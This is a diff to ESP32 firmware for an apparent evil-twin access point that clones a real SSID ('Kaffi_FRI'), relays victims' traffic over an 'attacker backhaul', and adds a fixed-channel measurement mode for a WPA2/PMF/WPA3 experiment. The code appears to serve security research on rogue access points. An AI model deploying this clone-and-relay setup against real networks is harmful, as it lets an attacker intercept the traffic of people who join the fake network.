@@ -30,8 +30,13 @@ esp_err_t wifi_twin_init(void)
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
     ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
+#if ALGHUL_MEASURE_STABLE
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    ESP_LOGI(TAG, "wifi initialised in AP-only (measurement) mode");
+#else
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
     ESP_LOGI(TAG, "wifi initialised in AP+STA mode");
+#endif
     return ESP_OK;
 }
 
@@ -42,6 +47,7 @@ static esp_err_t configure(const disguise_t *d)
     // ---- STA (uplink to the attacker backhaul, so the relay has internet) ----
     // Uplink is the laptop gateway (ALGHUL_UPLINK_SSID), deliberately a DIFFERENT
     // network from the advertised clone, so the victim never sees two "Kaffi_FRI".
+#if !ALGHUL_MEASURE_STABLE
     wifi_config_t sta = {0};
     strlcpy((char *)sta.sta.ssid,     ALGHUL_UPLINK_SSID, sizeof(sta.sta.ssid));
     strlcpy((char *)sta.sta.password, ALGHUL_UPLINK_PSK,  sizeof(sta.sta.password));
@@ -54,12 +60,17 @@ static esp_err_t configure(const disguise_t *d)
     }
     sta.sta.scan_method = WIFI_ALL_CHANNEL_SCAN;
     ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta));
+#endif
 
     // ---- AP (the clone the phone sees) ----
     wifi_config_t ap = {0};
     strlcpy((char *)ap.ap.ssid, ALGHUL_TARGET_SSID, sizeof(ap.ap.ssid));
     ap.ap.ssid_len       = strlen(ALGHUL_TARGET_SSID);
+#if ALGHUL_MEASURE_STABLE
+    ap.ap.channel        = ALGHUL_MEASURE_CHANNEL;  // pinned: steady co-channel beacon
+#else
     ap.ap.channel        = 1;  // the stack moves the AP to the STA channel on connect
+#endif
     ap.ap.max_connection = ALGHUL_AP_MAX_CONN;
     ap.ap.beacon_interval = d->beacon_interval;
     // ---- advertised security mode (the WPA2 / PMF / WPA3 experiment) --------
